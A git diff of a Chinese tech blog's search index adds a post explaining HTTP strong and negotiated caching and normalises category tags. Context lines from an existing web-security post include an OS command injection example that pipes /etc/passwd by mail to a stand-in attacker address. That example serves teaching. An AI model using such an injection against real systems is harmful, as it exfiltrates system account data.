@@ -1,6 +1,49 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>强缓存和协商缓存</title>
+    <url>/2022/05/02/%E5%BC%BA%E7%BC%93%E5%AD%98%E5%92%8C%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98/</url>
+    <content><![CDATA[<p>这里说的缓存是指浏览器（客户端）在本地磁盘中对访问过的资源保存的副本文件。</p>
+<p>浏览器缓存主要有以下几个优点：</p>
+<ul>
+<li>减少重复数据请求，避免通过网络再次加载资源，节省流量。</li>
+<li>降低服务器的压力，提升网站性能。</li>
+<li>加快客户端加载网页的速度， 提升用户体验。</li>
+</ul>
+<p>浏览器缓存分为强缓存和协商缓存，两者有两个比较明显的区别：</p>
+<ul>
+<li>如果浏览器命中强缓存，则不需要给服务器发请求；而协商缓存最终由服务器来决定是否使用缓存，即客户端与服务器之间存在一次通信。</li>
+<li>在 chrome 中强缓存（虽然没有发出真实的 http 请求）的请求状态码返回是 200 (from cache)；而协商缓存如果命中走缓存的话，请求的状态码是 304 (not modified)。 不同浏览器的策略不同，在 Fire Fox中，from cache 状态码是 304.</li>
+</ul>
+<h2 id="请求流程"><a href="#请求流程" class="headerlink" title="请求流程"></a>请求流程</h2><p>浏览器在第一次请求后缓存资源，再次请求时，会进行下面两个步骤：</p>
+<ul>
+<li>浏览器会获取该缓存资源的 header 中的信息，根据 response header 中的 expires 和 cache-control 来判断是否命中强缓存，如果命中则直接从缓存中获取资源。</li>
+<li>如果没有命中强缓存，浏览器就会发送请求到服务器，这次请求会带上 IF-Modified-Since 或者 IF-None-Match, 它们的值分别是第一次请求返回 Last-Modified或者 Etag，由服务器来对比这一对字段来判断是否命中。如果命中，则服务器返回 304 状态码，并且不会返回资源内容，浏览器会直接从缓存获取；否则服务器最终会返回资源的实际内容，并更新 header 中的相关缓存字段。</li>
+</ul>
+<h2 id="强缓存"><a href="#强缓存" class="headerlink" title="强缓存"></a>强缓存</h2><p>强缓存是根据返回头中的 Expires 或者 Cache-Control 两个字段来控制的，都是表示资源的缓存有效时间。</p>
+<ul>
+<li>Expires 是 http 1.0 的规范，值是一个GMT 格式的时间点字符串，比如 Expires:Mon,18 Oct 2066 23:59:59 GMT 。这个时间点代表资源失效的时间，如果当前的时间戳在这个时间之前，则判定命中缓存。有一个缺点是，失效时间是一个<strong>绝对时间</strong>，如果服务器时间与客户端时间偏差较大时，就会导致缓存混乱。而服务器的时间跟用户的实际时间是不一样是很正常的，所以 Expires 在实际使用中会带来一些麻烦。</li>
+<li>Cache-Control这个字段是 http 1.1 的规范，一般常用该字段的 max-age 值来进行判断，它是一个<strong>相对时间</strong>，比如 .Cache-Control:max-age=3600 代表资源的有效期是 3600 秒。并且返回头中的 Date 表示消息发送的时间，表示当前资源在 Date ~ Date +3600s 这段时间里都是有效的。不过我在实际使用中常常遇到设置了 max-age 之后，在 max-age 时间内重新访问资源却会返回 304 not modified ，这是由于服务器的时间与本地的时间不同造成的。当然 Cache-Control 还有其他几个值可以设置， 不过相对来说都很少用了：<ul>
+<li>no-cache 不使用本地缓存。需要使用协商缓存。</li>
+<li>no-store直接禁止浏览器缓存数据，每次请求资源都会向服务器要完整的资源， 类似于 network 中的 disabled cache。</li>
+<li>public 可以被所有用户缓存，包括终端用户和 cdn 等中间件代理服务器。</li>
+<li>private 只能被终端用户的浏览器缓存。</li>
+</ul>
+</li>
+</ul>
+<p>如果 Cache-Control与 Expires 同时存在的话， Cache-Control 的优先级高于 Expires 。</p>
+<h2 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h2><p>协商缓存是由服务器来确定缓存资源是否可用。 主要涉及到两对属性字段，都是成对出现的，即第一次请求的响应头带上某个字, Last-Modified 或者 Etag，则后续请求则会带上对应的请求字段 If-Modified-Since或者 If-None-Match，若响应头没有 Last-Modified 或者 Etag 字段，则请求头也不会有对应的字段。</p>
+<ul>
+<li>Last-Modified/If-Modified-Since 二者的值都是 GMT 格式的时间字符串， Last-Modified 标记最后文件修改时间， 下一次请求时，请求头中会带上 If-Modified-Since 值就是 Last-Modified 告诉服务器我本地缓存的文件最后修改的时间，在服务器上根据文件的最后修改时间判断资源是否有变化， 如果文件没有变更则返回 304 Not Modified ，请求不会返回资源内容，浏览器直接使用本地缓存。当服务器返回 304 Not Modified 的响应时，response header 中不会再添加的 Last-Modified 去试图更新本地缓存的 Last-Modified， 因为既然资源没有变化，那么 Last-Modified 也就不会改变；如果资源有变化，就正常返回返回资源内容，新的 Last-Modified 会在 response header 返回，并在下次请求之前更新本地缓存的 Last-Modified，下次请求时，If-Modified-Since会启用更新后的 Last-Modified。</li>
+<li>Etag/If-None-Match， 值都是由服务器为每一个资源生成的唯一标识串，只要资源有变化就这个值就会改变。服务器根据文件本身算出一个哈希值并通过 ETag字段返回给浏览器，接收到 If-None-Match 字段以后，服务器通过比较两者是否一致来判定文件内容是否被改变。与 Last-Modified 不一样的是，当服务器返回 304 Not Modified 的响应时，由于在服务器上ETag 重新计算过，response header中还会把这个 ETag 返回，即使这个 ETag 跟之前的没有变化。</li>
+</ul>
+<p>HTTP 中并没有指定如何生成 ETag，可以由开发者自行生成，哈希是比较理想的选择。</p>
+]]></content>
+      <categories>
+        <category>HTTP</category>
+      </categories>
+  </entry>
+  <entry>
     <title>浏览器垃圾回收机制</title>
     <url>/2022/05/02/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</url>
     <content><![CDATA[<h1 id="标记清理"><a href="#标记清理" class="headerlink" title="标记清理"></a>标记清理</h1><ul>
@@ -2496,7 +2539,7 @@
 <p>程序接收到该值后构成以下组合：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(MAIL,&quot;| /usr/sbin/sendmail;cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure>
 
-<p>“;”在OS命令中会被解析为分割多个执行命令的标记，因此sendmail会将含有Linux账户信息/etc/passwd的文件以邮件形式发送给<a href="mailto:&#x68;&#97;&#x63;&#x6b;&#64;&#101;&#x78;&#97;&#x6d;&#112;&#108;&#x65;&#46;&#x6a;&#112;">&#x68;&#97;&#x63;&#x6b;&#64;&#101;&#x78;&#97;&#x6d;&#112;&#108;&#x65;&#46;&#x6a;&#112;</a>。</p>
+<p>“;”在OS命令中会被解析为分割多个执行命令的标记，因此sendmail会将含有Linux账户信息/etc/passwd的文件以邮件形式发送给<a href="mailto:&#x68;&#97;&#99;&#x6b;&#x40;&#x65;&#120;&#x61;&#109;&#112;&#108;&#101;&#46;&#x6a;&#x70;">&#x68;&#97;&#99;&#x6b;&#x40;&#x65;&#120;&#x61;&#109;&#112;&#108;&#101;&#46;&#x6a;&#x70;</a>。</p>
 <h2 id="HTTP首部注入攻击"><a href="#HTTP首部注入攻击" class="headerlink" title="HTTP首部注入攻击"></a>HTTP首部注入攻击</h2><p>值攻击者通过在响应首部字段内插入换行，添加任意响应首部或主题的一种攻击，属于被动攻击模式。向首部主题内添加内容的攻击称为HTTP响应阶段攻击。</p>
 <p>HTTP首部注入攻击有可能会造成以下影响：</p>
 <ul>
@@ -2537,7 +2580,7 @@
 <p>多台计算机发起的DOS攻击称为DDOS攻击，DDOS攻击通常利用那些感染病毒的极端及作为攻击者的攻击跳板</p>
 ]]></content>
       <categories>
-        <category>http</category>
+        <category>HTTP</category>
       </categories>
   </entry>
   <entry>
@@ -2698,7 +2741,7 @@
 <p>如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到服务器返回的响应。</p>
 ]]></content>
       <categories>
-        <category>http</category>
+        <category>HTTP</category>
       </categories>
   </entry>
   <entry>
@@ -3089,7 +3132,7 @@
 </tbody></table>
 ]]></content>
       <categories>
-        <category>http</category>
+        <category>HTTP</category>
       </categories>
   </entry>
   <entry>
